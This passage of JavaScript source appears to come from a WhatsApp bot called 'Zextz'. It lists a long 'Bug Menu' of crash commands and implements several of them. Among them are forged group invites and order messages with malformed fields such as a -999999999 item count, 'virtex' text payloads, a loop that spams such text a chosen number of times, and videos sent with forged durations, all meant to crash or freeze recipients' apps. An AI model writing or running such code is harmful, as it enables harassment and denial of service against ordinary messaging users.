┃➣㋡⃟🎭 ${prefix}tomp3
║➣㋡⃟🎭 ${prefix}tomp4
┃➣㋡⃟🎭 ${prefix}toimg
║➣㋡⃟🎭 ${prefix}reverse
┃➣㋡⃟🎭 ${prefix}pastebin
╚❒

╔─❒「 𝐿𝑖𝑛𝑘 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}link1
║➣㋡⃟🎭 ${prefix}link2
┃➣㋡⃟🎭 ${prefix}link
╚❒

╔─❒「 𝐴𝑛𝑖𝑚𝑒 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}ahageo
║➣㋡⃟🎭 ${prefix}kodenuklir
┃➣㋡⃟🎭 ${prefix}nekopoi1
║➣㋡⃟🎭 ${prefix}nekopoi2
┃➣㋡⃟🎭 ${prefix}nekopoi3
║➣㋡⃟🎭 ${prefix}nekopoi4
┃➣㋡⃟🎭 ${prefix}nekopoi5
║➣㋡⃟🎭 ${prefix}nekopoi6
┃➣㋡⃟🎭 ${prefix}nekopoi7
║➣㋡⃟🎭 ${prefix}nekopoi8
┃➣㋡⃟🎭 ${prefix}nekopoi9
╚❒

╔─❒「  𝑆𝑒𝑎𝑟𝑐ℎ 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}ytsearch
║➣㋡⃟🎭 ${prefix}playstore
┃➣㋡⃟🎭 ${prefix}chara
║➣㋡⃟🎭 ${prefix}lirik
┃➣㋡⃟🎭 ${prefix}brainly
║➣㋡⃟🎭 ${prefix}pinterest
┃➣㋡⃟🎭 ${prefix}githubstalk
║➣㋡⃟🎭 ${prefix}igstalk
╚❒
`
teks =
`ZoeDev`
but = [
          { buttonId: `${prefix}cekgiff`, buttonText: { displayText: '𝐴𝐿𝐿 𝐵𝑈𝐺𝐵𝑂𝑇' }, type: 1 }
        ]
        sendButImage(from, menunya, teks, gambar, but)
break

case 'cekgiff':
gifnya = await getBuffer('https://telegra.ph/file/c134d982646a6925d39cd.mp4')
		anu =`
		
╔─❒ 「 𝐵𝑜𝑡 𝐼𝑛𝑓𝑜 」 ❒
┃ Nama Bot : 𝐙𝐞𝐱𝐭𝐳 𝐇𝐢𝐠𝐡𝟕
║ Prefix : Multi Prefix
┃ Nomor Owner : ${nomerOwner}
║ Runtime : ${runtime(process.uptime())}
┃ Language : Javascript & Nodejs
╚❏

╔─❒ 「 ㋡⃟🎭ꪶ 𝙏𝙌𝙏𝙌 ꫂ ꪶ〩ꫂ 」 ❒
┃ 𝐙𝐞𝐱𝐭𝐳 𝐇𝐢𝐠𝐡𝟕
║ https://bit.ly/3e7upsz
║ 𝐑𝐚𝐧𝐳 𝐌𝟓
┃ https://bit.ly/3yI9XYV
╚❏

╔─❒ 「 𝑈𝑠𝑒𝑟 𝐼𝑛𝑓𝑜 」 ❒
┃ Nama  : ${pushname}
┃ Nomor : ${sender.split('@')[0]}
╚❏

╔─❒「 𝐶𝑙𝑒𝑎𝑟 𝑀𝑒𝑛𝑢 」❒
║➣㋡⃟🎭 ${prefix}clear
╚❒

╔─❒「 𝐵𝑢𝑔 𝑀𝑒𝑛𝑢 」❒
┃➣
║➣㋡⃟🎭 ${prefix}xbug
┃➣㋡⃟🎭 ${prefix}virus1
║➣㋡⃟🎭 ${prefix}virus2
┃➣㋡⃟🎭 ${prefix}virus3
║➣㋡⃟🎭 ${prefix}virus4
┃➣㋡⃟🎭 ${prefix}virus5
║➣㋡⃟🎭 ${prefix}virus6
┃➣㋡⃟🎭 ${prefix}virus7
║➣㋡⃟🎭 ${prefix}virus8
┃➣㋡⃟🎭 ${prefix}virus9
║➣㋡⃟🎭 ${prefix}virus10
┃➣㋡⃟🎭 ${prefix}virus11
║➣㋡⃟🎭 ${prefix}virus12
┃➣㋡⃟🎭 ${prefix}virus13
║➣㋡⃟🎭 ${prefix}virus14
┃➣㋡⃟🎭 ${prefix}virus15
║➣㋡⃟🎭 ${prefix}virtagv2
┃➣㋡⃟🎭 ${prefix}virtagv3
║➣㋡⃟🎭 ${prefix}virtagv4
┃➣㋡⃟🎭 ${prefix}bugpc
║➣㋡⃟🎭 ${prefix}bugpc2
┃➣㋡⃟🎭 ${prefix}bugbrutal
║➣㋡⃟🎭 ${prefix}bugrow
┃➣㋡⃟🎭 ${prefix}bugbutton
║➣㋡⃟🎭 ${prefix}bug [Jumlah]
┃➣㋡⃟🎭 ${prefix}bugv2 [Jumlah]
║➣㋡⃟🎭 ${prefix}buggc [Jumlah]
┃➣㋡⃟🎭 ${prefix}sendbug [Jumlah]
║➣㋡⃟🎭 ${prefix}bugtext [Jumlah] 
┃➣㋡⃟🎭 ${prefix}bugstik 
║➣㋡⃟🎭 ${prefix}bugpdf 
┃➣㋡⃟🎭 ${prefix}pdfvirus 
║➣㋡⃟🎭 ${prefix}pdfvirusreal 
┃➣㋡⃟🎭 ${prefix}bugdoc 
║➣㋡⃟🎭 ${prefix}bugdokumen 
┃➣㋡⃟🎭 ${prefix}bugdokumenv2 
║➣㋡⃟🎭 ${prefix}sendallvirtex 
┃➣㋡⃟🎭 ${prefix}katalog 
║➣㋡⃟🎭 ${prefix}katalogv2 
┃➣㋡⃟🎭 ${prefix}katalogv3 
║➣㋡⃟🎭 ${prefix}jadic [teks] [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadicv2 [teks] [tag gambar] 
║➣㋡⃟🎭 ${prefix}jadicv3 [teks] [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadicv4 [teks] [tag gambar] 
║➣㋡⃟🎭 ${prefix}jadicv5 [teks] [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadicgb [teks] [tag gambar] 
║➣㋡⃟🎭 ${prefix}jadivirgam [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadivirgamv2 [tag gambar] 
║➣㋡⃟🎭 ${prefix}jadivirgamv3 [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadivirgamv4 [tag gambar] 
║➣㋡⃟🎭 ${prefix}jadivirgamv5 [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadivirgamv6 [tag gambar] 
║➣㋡⃟🎭 ${prefix}tovirgam [tag Sticker] 
┃➣㋡⃟🎭 ${prefix}tovirgamv2 [tag Sticker] 
║➣㋡⃟🎭 ${prefix}tovirgamv3 [tag Sticker] 
┃➣㋡⃟🎭 ${prefix}tovirgamv4 [tag Sticker] 
║➣㋡⃟🎭 ${prefix}tovirgamv5 [tag Sticker] 
┃➣㋡⃟🎭 ${prefix}tovirgamv6 [tag Sticker] 
║➣㋡⃟🎭 ${prefix}bugtrolilist
┃➣㋡⃟🎭 ${prefix}bugtroli 
║➣㋡⃟🎭 ${prefix}troli 
┃➣㋡⃟🎭 ${prefix}troliv2 
║➣㋡⃟🎭 ${prefix}bugsungsw 
┃➣㋡⃟🎭 ${prefix}bugsungswv2 
║➣㋡⃟🎭 ${prefix}bugcombine 
┃➣㋡⃟🎭 ${prefix}buglokasi 
║➣㋡⃟🎭 ${prefix}buglokasiv2 
┃➣㋡⃟🎭 ${prefix}allbuglokasi 
║➣㋡⃟🎭 ${prefix}buglociphone 
┃➣㋡⃟🎭 ${prefix}buglocandro [teks] 
║➣㋡⃟🎭 ${prefix}bugliveloc 
┃➣㋡⃟🎭 ${prefix}virlok [teks] 
║➣㋡⃟🎭 ${prefix}bugimg 
┃➣㋡⃟🎭 ${prefix}bugimgv2 
║➣㋡⃟🎭 ${prefix}bugr 
┃➣㋡⃟🎭 ${prefix}bughole 
║➣㋡⃟🎭 ${prefix}superhole 
┃➣㋡⃟🎭 ${prefix}bugweb [teks] 
║➣㋡⃟🎭 ${prefix}bugwebv2 [teks] 
┃➣㋡⃟🎭 ${prefix}buglink 
║➣㋡⃟🎭 ${prefix}buggif 
┃➣㋡⃟🎭 ${prefix}buggif2
║➣㋡⃟🎭 ${prefix}buggif3
┃➣㋡⃟🎭 ${prefix}buggif4
║➣㋡⃟🎭 ${prefix}buggif5
┃➣㋡⃟🎭 ${prefix}zextzdgx 
║➣㋡⃟🎭 ${prefix}bugarawareal 
┃➣㋡⃟🎭 ${prefix}bugarawa 
║➣㋡⃟🎭 ${prefix}bugarawaza 
┃➣㋡⃟🎭 ${prefix}jadivirus [Reply] 
║➣㋡⃟🎭 ${prefix}jadivirvid [Reply Video] 
┃➣㋡⃟🎭 ${prefix}jadivirvidv2 [Reply Video] 
║➣㋡⃟🎭 ${prefix}jadivirvidv3 [Reply Video] 
┃➣㋡⃟🎭 ${prefix}jadivirvidv4 [Reply Video] 
║➣㋡⃟🎭 ${prefix}jadivirvidv5 [Reply Video] 
┃➣㋡⃟🎭 ${prefix}jadivirvidv6 [Reply Video] 
║➣㋡⃟🎭 ${prefix}bugvn 
║➣㋡⃟🎭 ${prefix}bugvn2
║➣㋡⃟🎭 ${prefix}bugvn3
║➣㋡⃟🎭 ${prefix}bugvn4
┃➣㋡⃟🎭 ${prefix}bugvn5
║➣㋡⃟🎭 ${prefix}bugvideo 
┃➣㋡⃟🎭 ${prefix}bugvideov2 
║➣㋡⃟🎭 ${prefix}bugvideov3 
┃➣㋡⃟🎭 ${prefix}bugvideov4 
║➣㋡⃟🎭 ${prefix}bugvideov5 
┃➣㋡⃟🎭 ${prefix}jadivirtex [teks] 
║➣㋡⃟🎭 ${prefix}jadivirtexv2 [teks] 
┃➣㋡⃟🎭 ${prefix}hen 
║➣㋡⃟🎭 ${prefix}hen2
┃➣㋡⃟🎭 ${prefix}robot
║➣㋡⃟🎭 ${prefix}hen
┃➣㋡⃟🎭 ${prefix}love
║➣㋡⃟🎭 ${prefix}meme
┃➣㋡⃟🎭 ${prefix}pohonnatal
║➣㋡⃟🎭 ${prefix}spamvirtex [Total] 
┃➣㋡⃟🎭 ${prefix}bugnulis [teks] 
║➣㋡⃟🎭 ${prefix}bugneon [teks] 
┃➣㋡⃟🎭 ${prefix}bugtagall [teks] 
║➣㋡⃟🎭 ${prefix}buginvite 
┃➣㋡⃟🎭 ${prefix}virtagv5
║➣㋡⃟🎭 ${prefix}jadiphilips [teks] [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadiphilipsv2 [teks] [tag Sticker] 
║➣㋡⃟🎭 ${prefix}jadibugpdf [teks] [tag gambar] 
┃➣㋡⃟🎭 ${prefix}jadibugpdfv2 [teks] [tag Sticker] 
║➣㋡⃟🎭 ${prefix}jadibugjson [teks] [tag Gambar] 
┃➣㋡⃟🎭 ${prefix}jadibugjsonv2 [teks] [tag Sticker] 
║➣㋡⃟🎭 ${prefix}jadibugjs [teks] [tag Gambar]
┃➣㋡⃟🎭 ${prefix}jadibugjsv2 [teks] [tag Sticker]
║➣㋡⃟🎭 ${prefix}jadibugjson [teks] [tag Gambar]
┃➣㋡⃟🎭 ${prefix}jadibugjsonv2 [teks] [tag Sticker]
║➣㋡⃟🎭 ${prefix}jadibugxml [teks] [tag Gambar]
┃➣㋡⃟🎭 ${prefix}jadibugxmlv2 [teks] [tag Sticker]
║➣㋡⃟🎭 ${prefix}jadibugzip [teks] [tag Gambar]
┃➣㋡⃟🎭 ${prefix}jadibugzipv2 [teks] [tag Sticker]
║➣㋡⃟🎭 ${prefix}jadibug7z [teks] [tag Gambar]
┃➣㋡⃟🎭 ${prefix}jadibug7zv2 [teks] [tag Sticker]
║➣㋡⃟🎭 ${prefix}jadibugdoc [teks]
┃➣㋡⃟🎭 ${prefix}spamsw [teks] [Jumlah]
╚❒

`
limaa = fs.readFileSync('./audio menu/audio menu bug.mp3');
                    zoe.sendMessage(from, limaa, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
await zoe.sendMessage(from, gifnya, MessageType.video, {mimetype : 'video/gif', quoted: ftrol, thumbnail: gifnya, caption: anu})
break
case 'buginvite':
if (!dev.key.fromMe) return reply(mess.owner)
buf = fs.readFileSync('./database/media/gambar.jpg')
imeu = await zoe.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
jk = await zoe.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "6288224859350-1624969639@g.us",
"inviteCode": "h+64P9RhJDzgXSPf",
"inviteExpiration": "1625338378",
"groupName": `〽️ꪶ 𝐓𝐡𝐞 𝐙𝐞𝐱𝐭𝐳 𝐕𝟏 ꫂ ꪶ〩ꫂ🔥                                  ${vapi}`,
"jpegThumbnail": fs.readFileSync('./database/media/gambar.jpg')
}
}, {quoted:imeu, contextInfo:{}})
zoe.relayWAMessage(jk)
await setTimeout(() => {
reply('Zextz     ')
}, 3000)
                break  
break
case 'bugneon': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Teks`)
					bugve = args.join(" ")
					reply('Tunggu')
					anu = await await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/metallic?text=${bugve}&theme=neon&apikey=${XChillDs}`)
					buffer1 = await getBuffer(anu.result.url)
					zoe.sendMessage(from, buffer1, image, {thumbnail: virgam, quoted: dev, caption: `${bugve}\n\nDone`})
					break
case 'bugnulis':
if (args.length < 1) return reply(`[❗] CONTOH??\n*${prefix}${command} zoe*`)
                   F = body.slice(7)
                   reply(`Sbntr`)
                   anu = await getBuffer(`https://hardianto-chan.herokuapp.com/api/foliokiri?text=${F}&apikey=hardianto`)
                   zoe.sendMessage(from, anu, image, {thumbnail: virgam, caption: `Nih Ngabbbbbb `, quoted: dev})
                   break
case 'spamvirtex':
if (!dev.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await zoe.sendMessage(from, spamvirtex, text)
}
break
case 'hen':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄ ‏⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤ ‏⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿ ‏⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄ ‏⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶ ‏⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿ ‏⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ‏⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿ ‏⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿ ‏⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿ ‏⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛ ‏⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄ ‏⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄..
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'pohonnatal':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ░░░░░░░░░░ ★
░░░░░░░░░░██
░░░░░░░░░████
░░░░░░░██▒▒▒▒██
░░░░░██▒▒▒▒▒▒▒▒██
░░░░░░░██▒▒▒▒██
░░░░░░░░██████
░░░░░░░███▓▓███
░░░░░░░░█▓▓▓▓█
░░░░░░░█▓▓▓▓▓▓█
░░░░░░█▓▓▓▓▓▓▓▓█
░░░░░█▓▓▓▓▓▓▓▓▓▓█
░░░████▓▓▓▓▓▓▓▓████
░░█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
░███████▓▓▓▓▓▓███████
░░░░░░█▓▓▓▓▓▓▓▓█
░░░░░█▓▓▓▓▓▓▓▓▓▓█
░░░░█▓▓▓▓▓▓▓▓▓▓▓▓█
░░███▓▓▓▓▓▓▓▓▓▓▓▓███
░█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
███████▓▓▓▓▓▓▓▓███████
░░░░█▓▓▓▓▓▓▓▓▓▓▓▓█
░░░█▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
░░█▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█
░██▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██
██████████████████████
░░░░░░░░██████
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'meme':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄
░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄
░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█
░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░█
░▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░█
█▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒█
█▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█
░█▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░██░░▀█▄▄▄█▄▄█▄████░█
░░░░█░░░▀▀▄░█░░░█░███████░█
░░░░░▀▄░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░█
░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░█
░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░█
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'w':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = `▄▄▄▄▄▄▄░▄▄▄▄▄▄▄░▄▄▄▄▄▄░▄▄▄▄▄
░░▀███░░░░▀██░░░░██▀░░░░██░░
░░░▀██░░░░░▀██░░▄█░░░░░▄█░░░
░░░░███░░░░░▀██▄█░░░░░░█░░░░
░░░░░███░░░░░▀██░░░░░░█▀░░░░
░░░░░░███░░░░▄███░░░░█▀░░░░░
░░░░░░░██▄░░▄▀░███░░█▀░░░░░░
░░░░░░░▀██▄█▀░░░███▄▀░░░░░░░
░░░░░░░░▀██▀░░░░░███░░░░░░░░
░░░░░░░░░▀▀░░░░░░░▀░░░░░░░░░
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'robot':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` ░░░░░▄▄▀▀▀▀▀▀▀▀▀▄▄░░░░░
░░░░█░░░░░░░░░░░░░█░░░░
░░░█░░░░░░░░░░▄▄▄░░█░░░
░░░█░░▄▄▄░░▄░░███░░█░░░
░░░▄█░▄░░░▀▀▀░░░▄░█▄░░░
░░░█░░▀█▀█▀█▀█▀█▀░░█░░░
░░░▄██▄▄▀▀▀▀▀▀▀▄▄██▄░░░
░▄█░█▀▀█▀▀▀█▀▀▀█▀▀█░█▄░
`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'love':
if (!dev.key.fromMe) return reply('Lu siapa')
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
await zoe.toggleDisappearingMessages(from,`MODAR`,text)
lzain = ` _____8888888888____________________
____888888888888888_________________
__888888822222228888________________
_88888822222222288888_______________
888888222222222228888822228888______
888882222222222222288222222222888___
8888822222222222222222222222222288__
_8888822222222222222222222222222_88_
__88888222222222222222222222222__888
___888822222222222222222222222___888
____8888222222222222222222222____888
_____8888222222222222222222_____888_
______8882222222222222222_____8888__
_______888822222222222______888888__
________8888882222______88888888____
_________888888_____888888888_______
__________88888888888888____________
___________8888888888_______________
____________8888888_________________
_____________88888__________________
______________888___________________
_______________8____________________


`
zoe.sendMessage(from, lzain, text, {thumbnail: fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-999999999,"status":"INQUIRY","surface":"CATALOG","message":` 𝐑𝚊𝚗𝚣  𝑥 𝐙𝚎𝚡𝚝𝚣 `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await zoe.toggleDisappearingMessages(from,`HACKINGBYzoe999999`,text)
zoe.toggleDisappearingMessages(from,`${virtexbyzoe}`,text)
break
case 'bugvideov2':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/gif.mp4')
zoe.sendMessage(from, bugvideo, video, {thumbnail: virgam,  quoted: dev, mimetype: 'video/mp4' })
break
case 'bugvideo':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/gif.mp4')
zoe.sendMessage(from, bugvideo, video, { quoted: dev, thumbnail: virgamv2, videoname:`ꪶ𖣂ꫂ ${virtexbyzoe}.${virtexbyzoe}`, mimetype: 'video/mp4' })
break
case 'bugvideov3':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/myintro.mp4')
zoe.sendMessage(from, bugvideo, video, { quoted: dev, thumbnail: virgamv3, videoname:`ꪶ𖣂ꫂ ${virtexbyzoe}.${virtexbyzoe}`, duration: 999666, mimetype: 'video/mp4' })
break
case 'bugvideov4':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/m5.mp4')
zoe.sendMessage(from, bugvideo, video, { quoted: dev, thumbnail: virgamv4, duration: 999666, mimetype: 'video/mp4' })
break
case 'bugvideov5':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/m4.mp4')
zoe.sendMessage(from, bugvideo, video, { quoted: dev, thumbnail: virgamv5, duration: 999666, mimetype: 'video/mp4' })
break
case 'bugvideov6':             
if (!isOwner && !dev.key.fromMe) return
bugvideo = fs.readFileSync('./hm/m3.mp4')
zoe.sendMessage(from, bugvideo, video, { quoted: dev, thumbnail: virgamv6, duration: 999666, mimetype: 'video/mp4' })
break
case 'jadivirus':
            if ((isMedia && !dev.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
               zoe.sendMessage(from, ini_buffer, sticker, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
            } else if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            zoe.sendMessage(from, ini_buffer, image, { thumbnail : virgam, ftokoo, options})
            fs.unlinkSync(file)
        } else if ((isMedia && !dev.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
               zoe.sendMessage(from, ini_buffer, audio, { thumbnail : virgam, ftokoo})
            fs.unlinkSync(file)
        }  else if ((isMedia && !dev.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
